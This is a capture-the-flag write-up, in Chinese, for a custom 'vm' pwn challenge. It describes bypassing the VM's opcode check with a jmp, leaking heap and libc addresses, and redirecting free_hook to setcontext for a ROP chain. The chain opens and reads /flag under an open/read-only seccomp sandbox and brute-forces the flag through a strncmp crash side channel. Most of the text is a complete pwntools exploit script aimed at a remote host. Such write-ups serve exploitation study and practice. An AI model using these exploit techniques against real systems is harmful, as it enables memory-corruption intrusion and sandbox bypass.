# vm
vm程序:
```
read code
check code
set sandbox
run code
```
opcode:
```
'''
01 : push v8
02 : pop  v8
03 : ADD  [type] v8  , Imm
04 : sub  [type] v8  , Imm
05 : mul  [type] v8  , Imm
06 : div  [type] v8  , Imm
07 : AND  [type] v8  , Imm
08 : OR   [type] v8  , Imm
09 : XOR  [type] v8  , Imm
0a : NOT  v8
0b : jmp  PC + off(byte)
0c : call pc + off(word)
0d : ret
0e : mov  v8  , v9
0f : mov  [v8], v9
10 : mov  v8  , [v9]
11 : mov  [type] v8  , Imm
ff : nop
'''
```
可以利用"jmp"+0xFF绕过对opcode的check：绕过对stack越界的check

而后在run code时即可利用pop操作获得一个堆地址

而后即可利用内存操作指令进行任意堆地址读写，利用call会malloc new stack，并在ret时free，在中间修改chunk构造unsorted bin即可leak libc

获得libc地址后，注意sandbox：
```
===============================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x04 0x00 0x40000000  if (A >= 0x40000000) goto 0008
 0004: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0009
 0005: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0009
 0006: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0009
 0007: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0009
 0008: 0x06 0x00 0x00 0x00000000  return KILL
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

只有open read可以使用，因此先修改free_hook到setcontext进行栈迁移，在栈中布置好ROP:

首先open("/flag")而后read进堆空间，然后需要爆破操作:

可以选择:

```
https://kirin-say.top/2020/06/01/RCTF-2020-mginx-no-write/#0x02-no-write
```

也可以选择利用strncmp的方法：

libc 2.27，堆空间开始时固定：0x21000大小，每次设置一个字符到0x20FFF处，而后调用strncmp(flag_addr[index],heap_base+0x20FFF,2),当此位flag正确，则会比较第二位造成crash，在strncmp返回位置设置为read，即可通过判断阻塞和EOF来爆破flag

## EXP:
```
from pwn import *
import string
import time
'''
01 : push v8
02 : pop  v8
03 : ADD  [type] v8  , Imm
04 : sub  [type] v8  , Imm
05 : mul  [type] v8  , Imm
06 : div  [type] v8  , Imm
07 : AND  [type] v8  , Imm
08 : OR   [type] v8  , Imm
09 : XOR  [type] v8  , Imm
0a : NOT  v8
0b : jmp  PC + off(byte)
0c : call pc + off(word)
0d : ret
0e : mov  v8  , v9
0f : mov  [v8], v9
10 : mov  v8  , [v9]
11 : mov  [type] v8  , Imm
ff : nop
'''
key = string.digits+string.letters+"}{_-"
flag = ''
for index in range(0,0x30):
  for i in key:
    try:
      rdi=0x2155f
      rsi=0x023e8a
      rdx=0x1b96
      rax=0x043a78
      syscall=0x0110262
      strncmp=0x185780 #__strncmp_sse42
      #context.log_level="debug"
      #p=process("./vm")
      p=remote("123.57.4.93",8521)
      code="\x0b\x01\xff"
      code+="\x0c\xfa\x07"
      code+="\x04\x01\x07\x10\x05"
      code+="\x10\x05\x07"
      code+="\x0e\x04\x05"
      code+="\x03\x02\x05\x48\x1c\x00\x00" #free_hook
      code+="\x04\x02\x04\x5b\x9b\x39\x00" #setcontext
      code+="\x0f\x05\x04"

      code+="\x0c\x00\x00"

      code+="\x03\x02\x07\xa8\x07\x00\x00"
      code+="\x0e\x06\x07"
      code+="\x03\x02\x06\x10\x00\x00\x00"
      code+="\x0f\x07\x06"  #rsp

      code+="\x0e\x00\x05"
      code+="\x04\x03\x00"+p64(0x3ed8e8)
      code+="\x03\x03\x00"+p64(rdi)
      code+="\x0e\x01\x05"
      code+="\x04\x03\x01"+p64(0x3ed8e8)
      code+="\x03\x03\x01"+p64(rsi)
      code+="\x0e\x02\x05"
      code+="\x04\x03\x02"+p64(0x3ed8e8)
      code+="\x03\x03\x02"+p64(rdx)
      code+="\x0e\x03\x05"
      code+="\x04\x03\x03"+p64(0x3ed8e8)
      code+="\x03\x03\x03"+p64(rax)
      code+="\x0e\x04\x05"
      code+="\x04\x03\x04"+p64(0x3ed8e8)
      code+="\x03\x03\x04"+p64(syscall)

      #open
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x00" #pop rdi
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x04\x02\x06\xe0\x15\x00\x00"
      code+="\x0f\x07\x06" # "/flag"

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x01" #pop rsi
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(0)
      code+="\x0f\x07\x05"#0

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x02" #pop rdx
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(0)
      code+="\x0f\x07\x05"#0

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x03" #pop rax
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(2)
      code+="\x0f\x07\x05"#2

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x04" #syscall
      #read
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x00" #pop rdi
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(3)
      code+="\x0f\x07\x05"#2

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x01" #pop rsi
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x06" # "flag_addr"

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x02" #pop rdx
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(0x30)
      code+="\x0f\x07\x05"#0

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x03" #pop rax
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(0)
      code+="\x0f\x07\x05"#2

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x04" #syscall



      #strncmp
      #index=0
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x00" #pop rdi
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x03\x03\x06"+p64(index)
      code+="\x0f\x07\x06" # "flag_addr"

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x01" #pop rsi
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x03\x03\x06"+p64(0xe720-index-1)
      code+="\x0f\x07\x06" # "flag_addr"

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x02" #pop rdx
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(10)
      code+="\x0f\x07\x05"#0

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x04\x03\x04"+p64(syscall)
      code+="\x03\x03\x04"+p64(strncmp)
      code+="\x0f\x07\x04"#strncmp

      #read
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x04\x03\x04"+p64(strncmp)
      code+="\x03\x03\x04"+p64(syscall)
      code+="\x0f\x07\x00" #pop rdi
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(0)
      code+="\x0f\x07\x05"#2

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x01" #pop rsi
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x06" # "flag_addr"

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x02" #pop rdx
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(0x30)
      code+="\x0f\x07\x05"#0

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x03" #pop rax
      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x11\x03\x05"+p64(0)
      code+="\x0f\x07\x05"#2

      code+="\x03\x02\x07\x08\x00\x00\x00"
      code+="\x0f\x07\x04" #syscall

      code+="\x03\x03\x07"+p64(0xd038)
      code+="\x11\x03\x05"+p64(ord(i)*0x100000000000000)
      code+="\x0f\x07\x05"

      code+="\x0d"
      code+="\x10\x02\x02"
      code=code.ljust(0x800,"\xFF")
      code+="\x02\x07"
      code+="\x03\x01\x07\x18\x00"
      code+="\x03\x01\x06\x01\x05"
      code+="\x0f\x07\x06"
      code+="\x03\x02\x07\x00\x05\x00\x00"
      code+="\x11\x01\x06\x21\x00"
      code+="\x0f\x07\x06"
      code+="\x03\x02\x07\x20\x00\x00\x00"
      code+="\x11\x01\x06\x21\x00"
      code+="\x0f\x07\x06"
      code+="\x0d"
      code=code.ljust(0xa00,"\xff")
      code+="/flag\x00"
      #gdb.attach(p)
      p.sendafter(": \n",code.ljust(0x1000,"\xFF"))
      #time.sleep(0.1)
      p.recvuntil("\n")
      p.recv(timeout=0.5)
      p.send('kirin')
      p.close()
    except EOFError:
      flag += i
      print flag
```